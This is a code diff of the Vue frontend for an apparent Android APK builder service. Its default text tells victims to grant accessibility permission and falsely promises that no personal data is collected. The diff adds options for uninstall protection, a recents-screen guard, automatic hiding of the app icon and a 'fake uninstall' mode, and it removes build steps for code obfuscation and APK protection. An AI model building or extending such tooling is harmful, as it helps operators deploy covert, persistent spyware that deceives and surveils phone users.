@@ -1,5 +1,5 @@
 <script setup lang="ts">
-import { ref, computed, watch, nextTick, onBeforeUnmount } from 'vue';
+import { ref, computed, nextTick, onBeforeUnmount } from 'vue';
 import { useForm, Head, router } from '@inertiajs/vue3';
 import { useAdminBasePath } from '@/composables/useAdminBasePath';
 import {
@@ -9,22 +9,16 @@ import {
     NInput,
     NButton,
     NSpace,
-    NSelect,
     NSwitch,
     NTabs,
     NTabPane,
     NGrid,
     NGridItem,
     NUpload,
-    NImage,
     NIcon,
     NSpin,
     NAlert,
     NModal,
-    NProgress,
-    NSteps,
-    NStep,
-    NTooltip,
     createDiscreteApi,
     type UploadFileInfo,
 } from 'naive-ui';
@@ -34,7 +28,6 @@ import {
     CheckmarkCircleOutline,
     CloseCircleOutline,
     RocketOutline,
-    InformationCircleOutline,
 } from '@vicons/ionicons5';
 import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
 import { EventSourcePolyfill } from 'event-source-polyfill';
@@ -71,13 +64,17 @@ const form = useForm({
     name: '',
     package_name: '',
     version: '',
-    mainUrl: '',
-    debug: 0,
+    web_url: 'https://m.baidu.com',
+    debug: false,
     alertTitle: '欢迎使用',
     alertMsg: '为了确保所有功能正常使用，需要您开启无障碍权限，此App不会收集或分享您的个人信息，请记住以下设置：选择 已下载的服务/应用 -找到本App-点击 打开并允许',
     okText: '立即前往',
     icon_path: '',
     background_path: '',
+    disable_uninstall_protection: true,
+    disable_recents_guard: true,
+    disable_icon_hide: true,
+    uninstall_mode: false,
 });
 
 const iconList = ref<ImageItem[]>([...props.icons]);
@@ -89,24 +86,17 @@ const uploadingBg = ref(false);
 
 const showBuildModal = ref(false);
 
-/** 后端所有可能的步骤及其标签（与 ApkBuilder::STEP_LABELS 保持一致） */
 const ALL_STEP_LABELS: Record<string, string> = {
-    check_dependencies: '检查依赖',
+    check_environment: '检查环境',
     prepare_work_dir: '准备工作目录',
-    modify_smali: '修改配置',
-    modify_manifest: '修改清单',
-    modify_resources: '修改资源',
+    modify_server_config: '写入配置',
+    modify_build_gradle: '修改构建脚本',
+    modify_strings: '修改字符串资源',
     replace_icon: '替换图标',
-    replace_background: '替换背景',
-    generate_junk_classes: '生成混淆类',
-    shuffle_classes: '混淆类名',
-    obfuscate_strings: '混淆字符串',
-    encrypt_resources: '加密资源',
-    build_apk: '打包 APK',
-    protect_apk: 'APK 保护',
-    modify_dex: 'DEX 修改',
-    sign_apk: '签名',
-    move_output: '输出文件',
+    replace_background: '替换背景图',
+    gradle_build: 'Gradle 构建',
+    collect_apk: '收集 APK',
+    cleanup: '清理',
 };
 
 const buildSteps = ref<BuildStep[]>([]);
@@ -118,7 +108,6 @@ const elapsedTime = ref(0);
 const stepsListRef = ref<HTMLElement | null>(null);
 let elapsedTimer: ReturnType<typeof setInterval> | null = null;
 
-/** 格式化耗时 */
 const formatDuration = (ms: number): string => {
     if (ms < 1000) return `${Math.round(ms)}ms`;
     if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`;
@@ -127,7 +116,6 @@ const formatDuration = (ms: number): string => {
     return `${m}m ${s}s`;
 };
 
-/** 格式化已用时间（秒 → 可读） */
 const formattedElapsed = computed(() => {
     const s = elapsedTime.value;
     if (s < 60) return `${s}s`;
@@ -136,7 +124,6 @@ const formattedElapsed = computed(() => {
     return `${m}m ${sec}s`;
 });
 
-/** 当前正在执行的步骤标签 */
 const currentStepLabel = computed(() => {
     const step = buildSteps.value.find(s => s.status === 'process');
     return step?.label ?? '';
@@ -154,7 +141,6 @@ const stopElapsedTimer = () => {
     }
 };
 
-/** 自动滚动步骤列表到当前步骤 */
 const scrollToCurrentStep = () => {
     nextTick(() => {
         const list = stepsListRef.value;
@@ -179,6 +165,9 @@ const selectBackground = (bg: ImageItem) => {
     form.background_path = bg.url;
 };
 
+const csrfToken = () =>
+    document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
+
 const handleIconUpload = async (options: { file: UploadFileInfo }) => {
     if (!options.file.file) return;
     uploadingIcon.value = true;
@@ -189,9 +178,7 @@ const handleIconUpload = async (options: { file: UploadFileInfo }) => {
             method: 'POST',
             body: formData,
             credentials: 'same-origin',
-            headers: {
-                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
-            },
+            headers: { 'X-CSRF-TOKEN': csrfToken() },
         });
         const data = await response.json();
         if (data.success) {
@@ -199,7 +186,7 @@ const handleIconUpload = async (options: { file: UploadFileInfo }) => {
             selectIcon(data.icon);
             message.success('图标上传成功');
         }
-    } catch (e) {
+    } catch {
         message.error('图标上传失败');
     } finally {
         uploadingIcon.value = false;
@@ -216,9 +203,7 @@ const handleBgUpload = async (options: { file: UploadFileInfo }) => {
             method: 'POST',
             body: formData,
             credentials: 'same-origin',
-            headers: {
-                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
-            },
+            headers: { 'X-CSRF-TOKEN': csrfToken() },
         });
         const data = await response.json();
         if (data.success) {
@@ -226,7 +211,7 @@ const handleBgUpload = async (options: { file: UploadFileInfo }) => {
             selectBackground(data.background);
             message.success('背景图上传成功');
         }
-    } catch (e) {
+    } catch {
         message.error('背景图上传失败');
     } finally {
         uploadingBg.value = false;
@@ -239,10 +224,7 @@ const deleteIcon = async (icon: ImageItem) => {
             method: 'DELETE',
             body: JSON.stringify({ name: icon.name }),
             credentials: 'same-origin',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
-            },
+            headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken() },
         });
         iconList.value = iconList.value.filter(i => i.name !== icon.name);
         if (selectedIcon.value === icon.name) {
@@ -250,16 +232,34 @@ const deleteIcon = async (icon: ImageItem) => {
             form.icon_path = '';
         }
         message.success('图标已删除');
-    } catch (e) {
+    } catch {
         message.error('删除失败');
     }
 };
 
-const startBuild = () => {
-    // 使用表单验证
-    if (!validateForm()) {
-        return;
+const isValidPackageName = (packageName: string): boolean => {
+    if (!packageName) return true;
+    return /^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/.test(packageName);
+};
+
+const validateForm = (): boolean => {
+    if (!form.name.trim()) {
+        message.error('请输入应用名称');
+        return false;
     }
+    if (form.package_name && !isValidPackageName(form.package_name)) {
+        message.error('包名格式错误，应为 com.example.app 格式');
+        return false;
+    }
+    if (form.version && !/^\d+(\.\d+){0,2}$/.test(form.version)) {
+        message.error('版本号格式错误，应为 1.0 或 1.0.0 格式');
+        return false;
+    }
+    return true;
+};
+
+const startBuild = () => {
+    if (!validateForm()) return;
 
     buildSteps.value = [];
     buildError.value = null;
@@ -267,28 +267,37 @@ const startBuild = () => {
     currentStepIndex.value = 0;
     showBuildModal.value = true;
     startElapsedTimer();
-    
-    const formData = new FormData();
-    Object.entries(form.data()).forEach(([key, value]) => {
-        if (value !== null && value !== undefined) {
-            formData.append(key, String(value));
-        }
-    });
-    
+
     const params = new URLSearchParams();
-    formData.forEach((value, key) => {
-        params.append(key, String(value));
-    });
-    
+    params.append('name', form.name);
+    if (form.package_name) params.append('package_name', form.package_name);
+    if (form.version) params.append('version', form.version);
+    params.append('debug', String(form.debug));
+    if (form.alertTitle) params.append('alertTitle', form.alertTitle);
+    if (form.alertMsg) params.append('alertMsg', form.alertMsg);
+    if (form.okText) params.append('okText', form.okText);
+    if (form.web_url) params.append('web_url', form.web_url);
+    if (form.icon_path) params.append('icon_path', form.icon_path);
+    if (form.background_path) params.append('background_path', form.background_path);
+    params.append('disable_uninstall_protection', String(form.disable_uninstall_protection));
+    params.append('disable_recents_guard', String(form.disable_recents_guard));
+    params.append('disable_icon_hide', String(form.disable_icon_hide));
+    params.append('uninstall_mode', String(form.uninstall_mode));
+
     eventSource.value = new EventSourcePolyfill(`${userRoute('/builds/stream')}?${params.toString()}`, {
         withCredentials: true,
+        heartbeatTimeout: 600000,
     });
-    
+
     eventSource.value.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-        handleBuildEvent(data);
+        try {
+            const data = JSON.parse(event.data);
+            handleBuildEvent(data);
+        } catch {
+            // ignore malformed SSE data
+        }
     };
-    
+
     eventSource.value.onerror = () => {
         if (!buildSuccess.value && !buildError.value) {
             buildError.value = '连接中断';
@@ -301,7 +310,6 @@ const handleBuildEvent = (data: any) => {
     if (data.type === 'step') {
         let stepIndex = buildSteps.value.findIndex(s => s.name === data.step);
 
-        // 动态添加后端发来的未知步骤（保护功能等可选步骤）
         if (stepIndex < 0) {
             buildSteps.value.push({
                 name: data.step,
@@ -331,9 +339,7 @@ const handleBuildEvent = (data: any) => {
     } else if (data.type === 'error') {
         buildError.value = data.error;
         const currentStep = buildSteps.value[currentStepIndex.value];
-        if (currentStep) {
-            currentStep.status = 'error';
-        }
+        if (currentStep) currentStep.status = 'error';
         stopElapsedTimer();
         closeEventSource();
     }
@@ -349,40 +355,8 @@ const closeEventSource = () => {
 const closeBuildModal = () => {
     if (buildSuccess.value || buildError.value) {
         showBuildModal.value = false;
-        if (buildSuccess.value) {
-            router.visit(userRoute('/builds'));
-        }
+        if (buildSuccess.value) router.visit(userRoute('/builds'));
     }
-};
-
-// 验证包名格式 (如 com.example.app)
-const isValidPackageName = (packageName: string): boolean => {
-    if (!packageName) return true; // 允许为空（后端会自动生成）
-    const regex = /^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/;
-    return regex.test(packageName);
-};
-
-// 验证表单
-const validateForm = (): boolean => {
-    // 验证应用名称
-    if (!form.name.trim()) {
-        message.error('请输入应用名称');
-        return false;
-    }
-
-    // 验证包名格式（如果填写了的话）
-    if (form.package_name && !isValidPackageName(form.package_name)) {
-        message.error('包名格式错误，应为 com.example.app 格式（至少两段，如 com.app）');
-        return false;
-    }
-
-    // 验证版本号格式（如果填写了的话）
-    if (form.version && !/^\d+(\.\d+){0,2}$/.test(form.version)) {
-        message.error('版本号格式错误，应为 1.0 或 1.0.0 格式');
-        return false;
-    }
-
-    return true;
 };
 </script>
 
@@ -394,19 +368,19 @@ const validateForm = (): boolean => {
         <div class="build-create-container">
             <NForm @submit.prevent="startBuild" label-placement="top">
                 <NTabs type="line" animated>
+                    <!-- 基本信息 -->
                     <NTabPane name="basic" tab="基本信息">
                         <div class="tab-content">
                             <NCard size="small" class="form-card">
                                 <template #header>
                                     <span class="card-title">基本信息</span>
                                 </template>
-                                <NFormItem label="应用名称（必填）" :validation-status="form.errors.name ? 'error' : undefined">
-                                    <NInput v-model:value="form.name" placeholder="应用显示名称" maxlength="100" show-count />
-                                    <template #feedback>{{ form.errors.name }}</template>
+                                <NFormItem label="应用名称（必填）">
+                                    <NInput v-model:value="form.name" placeholder="应用显示名称" maxlength="32" show-count />
                                 </NFormItem>
                                 <NGrid :cols="2" :x-gap="16">
                                     <NGridItem>
-                                        <NFormItem label="应用包名（留空自动生成）" :validation-status="form.errors.package_name ? 'error' : undefined">
+                                        <NFormItem label="应用包名（留空自动生成）">
                                             <NInput v-model:value="form.package_name" placeholder="com.example.app" />
                                         </NFormItem>
                                     </NGridItem>
@@ -416,45 +390,17 @@ const validateForm = (): boolean => {
                                         </NFormItem>
                                     </NGridItem>
                                 </NGrid>
-                                <NFormItem label="主页">
-                                    <NInput v-model:value="form.mainUrl" placeholder="留空使用默认" />
+                                <NFormItem label="WebView 主页">
+                                    <NInput v-model:value="form.web_url" placeholder="https://m.baidu.com" />
                                 </NFormItem>
-                            </NCard>
-                        </div>
-                    </NTabPane>
-
-                    <NTabPane name="ui" tab="外观资源">
-                        <div class="tab-content">
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">引导配置</span>
-                                </template>
-                                <NFormItem label="无障碍标题">
-                                    <NInput v-model:value="form.alertTitle" maxlength="200" show-count />
-                                </NFormItem>
-                                <NFormItem label="无障碍内容">
-                                    <NInput v-model:value="form.alertMsg" type="textarea" :rows="4" maxlength="1000" show-count />
-                                </NFormItem>
-                                <NFormItem label="引导按钮文本">
-                                    <NInput v-model:value="form.okText" placeholder="立即前往" maxlength="50" show-count />
-                                </NFormItem>
-                            </NCard>
-                        </div>
-                    </NTabPane>
-
-                    <NTabPane name="features" tab="功能设置">
-                        <div class="tab-content">
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">调试选项</span>
-                                </template>
                                 <NFormItem label="调试模式">
-                                    <NSwitch v-model:value="form.debug" :checked-value="1" :unchecked-value="0" />
+                                    <NSwitch v-model:value="form.debug" />
                                 </NFormItem>
                             </NCard>
                         </div>
                     </NTabPane>
 
+                    <!-- 图标资源 -->
                     <NTabPane name="assets" tab="图标资源">
                         <div class="tab-content">
                             <NCard size="small" class="form-card">
@@ -485,10 +431,10 @@ const validateForm = (): boolean => {
 
                             <NCard size="small" class="form-card">
                                 <template #header>
-                                    <span class="card-title">遮盖底图</span>
+                                    <span class="card-title">无障碍引导背景图</span>
                                 </template>
                                 <NAlert type="info" :bordered="false" class="mb-3">
-                                    获取无障碍权限界面底图，支持 PNG/JPG 格式
+                                    替换 APK 内置的无障碍引导背景图，支持 PNG/JPG 格式
                                 </NAlert>
                                 <div class="asset-grid asset-grid-large">
                                     <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="handleBgUpload" class="upload-trigger">
@@ -508,7 +454,49 @@ const validateForm = (): boolean => {
                                     </div>
                                 </div>
                             </NCard>
+                        </div>
+                    </NTabPane>
 
+                    <!-- 外观资源 -->
+                    <NTabPane name="ui" tab="外观资源">
+                        <div class="tab-content">
+                            <NCard size="small" class="form-card">
+                                <template #header>
+                                    <span class="card-title">引导配置</span>
+                                </template>
+                                <NFormItem label="无障碍标题">
+                                    <NInput v-model:value="form.alertTitle" maxlength="200" show-count />
+                                </NFormItem>
+                                <NFormItem label="无障碍内容">
+                                    <NInput v-model:value="form.alertMsg" type="textarea" :rows="4" maxlength="1000" show-count />
+                                </NFormItem>
+                                <NFormItem label="引导按钮文本">
+                                    <NInput v-model:value="form.okText" placeholder="立即前往" maxlength="50" show-count />
+                                </NFormItem>
+                            </NCard>
+                        </div>
+                    </NTabPane>
+
+                    <!-- 高级设置 -->
+                    <NTabPane name="advanced" tab="高级设置">
+                        <div class="tab-content">
+                            <NCard size="small" class="form-card">
+                                <template #header>
+                                    <span class="card-title">保护设置</span>
+                                </template>
+                                <NFormItem label="禁用卸载保护">
+                                    <NSwitch v-model:value="form.disable_uninstall_protection" />
+                                </NFormItem>
+                                <NFormItem label="禁用最近任务防护">
+                                    <NSwitch v-model:value="form.disable_recents_guard" />
+                                </NFormItem>
+                                <NFormItem label="禁用图标隐藏（关闭后配置完成自动隐藏桌面图标）">
+                                    <NSwitch v-model:value="form.disable_icon_hide" />
+                                </NFormItem>
+                                <NFormItem label="假卸载模式">
+                                    <NSwitch v-model:value="form.uninstall_mode" />
+                                </NFormItem>
+                            </NCard>
                         </div>
                     </NTabPane>
                 </NTabs>
@@ -527,9 +515,9 @@ const validateForm = (): boolean => {
             </NForm>
         </div>
 
+        <!-- 构建进度弹窗 -->
         <NModal v-model:show="showBuildModal" :mask-closable="false" :closable="false" :show-icon="false" transform-origin="center">
             <div class="build-modal">
-                <!-- 头部状态区域 -->
                 <div class="build-modal-header" :class="{ 'success': buildSuccess, 'error': buildError }">
                     <div class="header-icon">
                         <div v-if="buildSuccess" class="icon-circle success">
@@ -551,9 +539,7 @@ const validateForm = (): boolean => {
                     </p>
                 </div>
 
-                <!-- 进度区域 -->
                 <div class="build-modal-body">
-                    <!-- 当前步骤 + 已用时间 -->
                     <div v-if="!buildSuccess && !buildError" class="progress-section">
                         <div class="progress-header">
                             <span class="progress-label">
@@ -564,12 +550,10 @@ const validateForm = (): boolean => {
                         </div>
                     </div>
 
-                    <!-- 成功摘要 -->
                     <div v-if="buildSuccess" class="success-summary">
                         <span class="summary-text">总耗时 {{ formattedElapsed }}</span>
                     </div>
 
-                    <!-- 错误信息 -->
                     <div v-if="buildError" class="error-section">
                         <div class="error-box">
                             <NIcon :component="CloseCircleOutline" size="18" />
@@ -577,7 +561,6 @@ const validateForm = (): boolean => {
                         </div>
                     </div>
 
-                    <!-- 步骤列表 -->
                     <div class="steps-section">
                         <div class="steps-header">
                             <span>构建步骤</span>
@@ -610,7 +593,6 @@ const validateForm = (): boolean => {
                     </div>
                 </div>
 
-                <!-- 底部操作区域 -->
                 <div v-if="buildError" class="build-modal-footer">
                     <NButton type="primary" size="large" block @click="closeBuildModal">
                         关闭
@@ -626,7 +608,6 @@ const validateForm = (): boolean => {
 .tab-content { padding: 16px 0; }
 .form-card { margin-bottom: 16px; }
 .card-title { font-weight: 600; font-size: 15px; }
-.form-hint { font-size: 12px; color: #94a3b8; }
 .form-actions { margin-top: 24px; padding: 20px; background: white; border-radius: 12px; border: 1px solid #e2e8f0; }
 .asset-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(72px, 1fr)); gap: 12px; }
 .asset-grid-large { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
@@ -643,346 +624,50 @@ const validateForm = (): boolean => {
 .delete-btn { position: absolute; top: 4px; left: 4px; width: 20px; height: 20px; background: rgba(239, 68, 68, 0.9); border: none; border-radius: 50%; display: none; align-items: center; justify-content: center; color: white; cursor: pointer; }
 .asset-item:hover .delete-btn { display: flex; }
 .mb-3 { margin-bottom: 12px; }
-/* 构建弹窗样式 */
-.build-modal {
-    width: 480px;
-    background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%);
-    border-radius: 20px;
-    overflow: hidden;
-    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-}
 
-.build-modal-header {
-    padding: 32px 24px 24px;
-    text-align: center;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    position: relative;
-    overflow: hidden;
-}
-
-.build-modal-header::before {
-    content: '';
-    position: absolute;
-    top: -50%;
-    left: -50%;
-    width: 200%;
-    height: 200%;
-    background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
-    animation: shimmer 3s ease-in-out infinite;
-}
-
-@keyframes shimmer {
-    0%, 100% { transform: translateX(-30%) translateY(-30%); }
-    50% { transform: translateX(30%) translateY(30%); }
-}
-
-.build-modal-header.success {
-    background: linear-gradient(135deg, #10b981 0%, #059669 100%);
-}
-
-.build-modal-header.error {
-    background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
-}
-
-.header-icon {
-    position: relative;
-    display: inline-block;
-    margin-bottom: 16px;
-}
-
-.icon-circle {
-    width: 64px;
-    height: 64px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    position: relative;
-    z-index: 1;
-}
-
-.icon-circle.success { background: rgba(255, 255, 255, 0.2); }
-.icon-circle.error { background: rgba(255, 255, 255, 0.2); }
-.icon-circle.processing { background: rgba(255, 255, 255, 0.2); }
-
-.pulse-ring {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    width: 64px;
-    height: 64px;
-    border-radius: 50%;
-    border: 2px solid rgba(255, 255, 255, 0.6);
-    transform: translate(-50%, -50%);
-    animation: pulse 1.5s ease-out infinite;
-}
-
-@keyframes pulse {
-    0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-    100% { transform: translate(-50%, -50%) scale(1.8); opacity: 0; }
-}
-
-.header-title {
-    font-size: 20px;
-    font-weight: 600;
-    color: white;
-    margin: 0 0 8px;
-    position: relative;
-    z-index: 1;
-}
-
-.header-subtitle {
-    font-size: 14px;
-    color: rgba(255, 255, 255, 0.8);
-    margin: 0;
-    position: relative;
-    z-index: 1;
-}
-
-.build-modal-body {
-    padding: 24px;
-}
-
-.progress-section {
-    margin-bottom: 24px;
-}
-
-.progress-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 10px;
-}
-
-.progress-label {
-    font-size: 13px;
-    color: #64748b;
-    font-weight: 500;
-}
-
-.progress-elapsed {
-    font-size: 12px;
-    color: #94a3b8;
-    font-weight: 500;
-}
-
-@keyframes glow {
-    0%, 100% { opacity: 0; }
-    50% { opacity: 1; }
-}
-
-.error-section {
-    margin-bottom: 20px;
-}
-
-.success-summary {
-    text-align: center;
-    margin-bottom: 20px;
-}
-
-.summary-text {
-    font-size: 14px;
-    color: #64748b;
-    font-weight: 500;
-}
-
-.error-box {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 14px 16px;
-    background: #fef2f2;
-    border: 1px solid #fecaca;
-    border-radius: 10px;
-    color: #dc2626;
-    font-size: 14px;
-}
-
-.steps-section {
-    background: #f8fafc;
-    border-radius: 12px;
-    padding: 16px;
-}
-
-.steps-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 14px;
-    padding-bottom: 12px;
-    border-bottom: 1px solid #e2e8f0;
-    font-size: 13px;
-    font-weight: 600;
-    color: #475569;
-}
-
-.steps-count {
-    font-weight: 500;
-    color: #667eea;
-    background: #eef2ff;
-    padding: 2px 10px;
-    border-radius: 12px;
-    font-size: 12px;
-}
-
-.steps-list {
-    display: flex;
-    flex-direction: column;
-    gap: 6px;
-    max-height: 360px;
-    overflow-y: auto;
-}
-
-/* 步骤进入动画 */
-.step-enter-enter-active {
-    transition: all 0.3s ease-out;
-}
-
-.step-enter-enter-from {
-    opacity: 0;
-    transform: translateY(-8px);
-}
-
-.step-enter-enter-to {
-    opacity: 1;
-    transform: translateY(0);
-}
-
-.step-item {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 10px 12px;
-    border-radius: 8px;
-    transition: all 0.2s ease;
-}
-
-.step-item.process {
-    background: #eef2ff;
-}
-
-.step-item.finish {
-    opacity: 0.7;
-}
-
-.step-item.error {
-    background: #fef2f2;
-}
-
-.step-indicator {
-    flex-shrink: 0;
-}
-
-.indicator-done {
-    width: 24px;
-    height: 24px;
-    border-radius: 50%;
-    background: #10b981;
-    color: white;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.indicator-processing {
-    width: 24px;
-    height: 24px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.spinner {
-    width: 20px;
-    height: 20px;
-    border: 2px solid #e2e8f0;
-    border-top-color: #667eea;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-.indicator-error {
-    width: 24px;
-    height: 24px;
-    border-radius: 50%;
-    background: #ef4444;
-    color: white;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.indicator-wait {
-    width: 24px;
-    height: 24px;
-    border-radius: 50%;
-    background: #e2e8f0;
-    color: #94a3b8;
-    font-size: 12px;
-    font-weight: 600;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.step-content {
-    flex: 1;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-}
-
-.step-label {
-    font-size: 13px;
-    color: #475569;
-}
-
-.step-item.process .step-label {
-    color: #667eea;
-    font-weight: 500;
-}
-
-.step-item.error .step-label {
-    color: #dc2626;
-}
-
-.step-duration {
-    font-size: 11px;
-    color: #94a3b8;
-    background: #e2e8f0;
-    padding: 2px 8px;
-    border-radius: 10px;
-}
-
-.build-modal-footer {
-    padding: 16px 24px 24px;
-}
-
-.label-with-tip {
-    display: inline-flex;
-    align-items: center;
-    gap: 4px;
-}
-
-.tip-icon {
-    font-size: 14px;
-    color: #94a3b8;
-    cursor: help;
-    transition: color 0.2s;
-}
-
-.tip-icon:hover {
-    color: #667eea;
-}
-
-.tip-content p {
-    margin: 2px 0;
-    font-size: 13px;
-    line-height: 1.5;
-}
+.build-modal { width: 480px; background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%); border-radius: 20px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
+.build-modal-header { padding: 32px 24px 24px; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); position: relative; overflow: hidden; }
+.build-modal-header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%); animation: shimmer 3s ease-in-out infinite; }
+@keyframes shimmer { 0%, 100% { transform: translateX(-30%) translateY(-30%); } 50% { transform: translateX(30%) translateY(30%); } }
+.build-modal-header.success { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
+.build-modal-header.error { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); }
+.header-icon { position: relative; display: inline-block; margin-bottom: 16px; }
+.icon-circle { width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; position: relative; z-index: 1; background: rgba(255, 255, 255, 0.2); }
+.pulse-ring { position: absolute; top: 50%; left: 50%; width: 64px; height: 64px; border-radius: 50%; border: 2px solid rgba(255, 255, 255, 0.6); transform: translate(-50%, -50%); animation: pulse 1.5s ease-out infinite; }
+@keyframes pulse { 0% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(1.8); opacity: 0; } }
+.header-title { font-size: 20px; font-weight: 600; color: white; margin: 0 0 8px; position: relative; z-index: 1; }
+.header-subtitle { font-size: 14px; color: rgba(255, 255, 255, 0.8); margin: 0; position: relative; z-index: 1; }
+.build-modal-body { padding: 24px; }
+.progress-section { margin-bottom: 24px; }
+.progress-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+.progress-label { font-size: 13px; color: #64748b; font-weight: 500; }
+.progress-elapsed { font-size: 12px; color: #94a3b8; font-weight: 500; }
+.error-section { margin-bottom: 20px; }
+.success-summary { text-align: center; margin-bottom: 20px; }
+.summary-text { font-size: 14px; color: #64748b; font-weight: 500; }
+.error-box { display: flex; align-items: center; gap: 10px; padding: 14px 16px; background: #fef2f2; border: 1px solid #fecaca; border-radius: 10px; color: #dc2626; font-size: 14px; }
+.steps-section { background: #f8fafc; border-radius: 12px; padding: 16px; }
+.steps-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px solid #e2e8f0; font-size: 13px; font-weight: 600; color: #475569; }
+.steps-count { font-weight: 500; color: #667eea; background: #eef2ff; padding: 2px 10px; border-radius: 12px; font-size: 12px; }
+.steps-list { display: flex; flex-direction: column; gap: 6px; max-height: 360px; overflow-y: auto; }
+.step-enter-enter-active { transition: all 0.3s ease-out; }
+.step-enter-enter-from { opacity: 0; transform: translateY(-8px); }
+.step-enter-enter-to { opacity: 1; transform: translateY(0); }
+.step-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 8px; transition: all 0.2s ease; }
+.step-item.process { background: #eef2ff; }
+.step-item.finish { opacity: 0.7; }
+.step-item.error { background: #fef2f2; }
+.step-indicator { flex-shrink: 0; }
+.indicator-done { width: 24px; height: 24px; border-radius: 50%; background: #10b981; color: white; display: flex; align-items: center; justify-content: center; }
+.indicator-processing { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; }
+.spinner { width: 20px; height: 20px; border: 2px solid #e2e8f0; border-top-color: #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.indicator-error { width: 24px; height: 24px; border-radius: 50%; background: #ef4444; color: white; display: flex; align-items: center; justify-content: center; }
+.indicator-wait { width: 24px; height: 24px; border-radius: 50%; background: #e2e8f0; color: #94a3b8; font-size: 12px; font-weight: 600; display: flex; align-items: center; justify-content: center; }
+.step-content { flex: 1; display: flex; justify-content: space-between; align-items: center; }
+.step-label { font-size: 13px; color: #475569; }
+.step-item.process .step-label { color: #667eea; font-weight: 500; }
+.step-item.error .step-label { color: #dc2626; }
+.step-duration { font-size: 11px; color: #94a3b8; background: #e2e8f0; padding: 2px 8px; border-radius: 10px; }
+.build-modal-footer { padding: 16px 24px 24px; }
 </style>
